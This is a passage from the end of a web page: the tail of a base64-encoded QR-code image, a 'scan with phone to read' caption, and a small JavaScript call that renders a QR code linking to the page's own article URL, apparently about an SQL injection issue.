YN8Um8CbaPvZ5WxtUeIZ4C6LjSV33hc7XQ9RD+as0ql/dhv9JlDmIt64XOQ+Sgo3MVQtdB+Fm3b0g+jTfw90DeYAh5C8uBZOHo69raPpMbtY5hvr5jf8dC18m3QfSAjtZVCKFzvbDSiZflHDzW5py0sszBo37MW/vlgbjBxu89gWkgEJMElisB7adQC6FzEL6eBJk1GcWvDKKHayBiwFSJuacFQNsvhG+dNUcIoYeOroXgHAvdByIH/UcI5zKqxjYNJAu3//oT2AN5/ZkvV5x+UvfVEVaV4kezbuQVQ1xba4QQHHQUL4OZE/+npr3InvWR5oy5j7XQ9w3hW5MRIgc0GmjfTvcNacfyHk4bCPQpwed8PyXVS1rlVnrVOQ+xH8cZIXKwfuOE0KmvLfexD6GDjqschM6ajF5HCKGTb8ta+20gJjZeewLtd1nehqcnPMtBTB8CXSeEmRM/GhzrtBfZWKNYvA3mHjBzqntm7imEuYd4mfvIH825Z5jrLrghz7b3d+f3QN5s/m0gvjZ5fysO4hoDraTSOwm0j3bmrBeag64TL3NOvs1cRueg98j50YfQjfwYu29GOK6FyEFH1+be5qDr2kCycPvXnUAbCMSU8lYgOOjovKcrNAddB+E7l1E1smdczsuH6AkovBnQbh6Ef0v84ReIXsCpTkDbh17baKsmWdsGsirYudedwB7I68761Ertd1m+NrnKXEboVxPCz3n5uYd98TZzEPWAqQcE2rcB4CHnXhktWHFA62k9zJxzR+g1nHcshOjn3BHCrNs35Oi0LuJPDQRikkDbpp4Em0ng9vSZFzpXofI25x0Lza0QYk3ov8uCmVv1yDmtO1rOH/nQ1zzSHPHQa08N5KjRO/H/l73sgbzZJKdfLub9QVylfIWdh8hBR+fOIvRamP28rvzcF0JfcdLaIHQQaP4I3Q9CDx2dE0LwR33ES2eD0Ds+wn1Djk7mIr597PX6EJOE9ZukngCba8fYvBB6X8Uy6zOKt0HUOH6G7gNRB7QS5xqRHOD2YQQ6pnT5H3a7H0RN1kNw0DHn7buHY+G+ITqFN7I9kDcahrby6Td16NcQwvfVg4iho3MZIfLagA1mzjXWPEOIHq7LuKqtdBUH0R86ui/MnHNC94Oug/CVt+0b4pN4E5ze1D3JjHmvmbef8/LNCxWPJl4G8YQAo+QWA7c321swfFG9bKB/JITn+9BeRvvKZvYNWZ7a65PtPQTiKYDPo7ftJwTO9XCd0LUZxT+zrLf/rMZ5iH06FroHRA76x3/nhNJmg67P/Blf/Wz7hpw5sRdq9kBeeNhnlmoD8ZU5i6vmVY+V/ijnPs47FkL/FgHhWwcRA6YaArcPCtC/FbXkbwci/9v91F/tyfapwt9iiDWB/b/4+3izP+2GeF/QpwWzb90KYa7z05Ox6gG91nnoHISf+9i33rHQXIUQvXJONaPl/OhD9IAZR+1RnNebBnJUtPnXnMAeyGvO+fQq3zoQiGubV/d1zJx954TmViidDea1qlp41Lk+Y1VXcRC9oP5A4Br3dpzRuYw5/60DyY23f3wCq8y3DiRP3b4Xh/50mcsIkX/G5bx8iDqoUZojg6ip8hA56Fjp/DozVjqIPqscsD/2frzZn2+9IW/22v6T25kGkq9e5Z95lRDXEzrmXu4BPW/uLOZ+9l3rWGgOYi3HRwizTn1kuQZCB8eomtGqHlkzDSQXbP/1J9AGAseThjm32mqeuP2VXrmVrspB7Em132nVWqv+Kz3EHqHjqpdybSAKtl1/Ansg18/gYQf/AgAA///0xh7WAAAABklEQVQDAPt0N5I6+2gYAAAAAElFTkSuQmCC)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/dongsheng-DsWebService-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 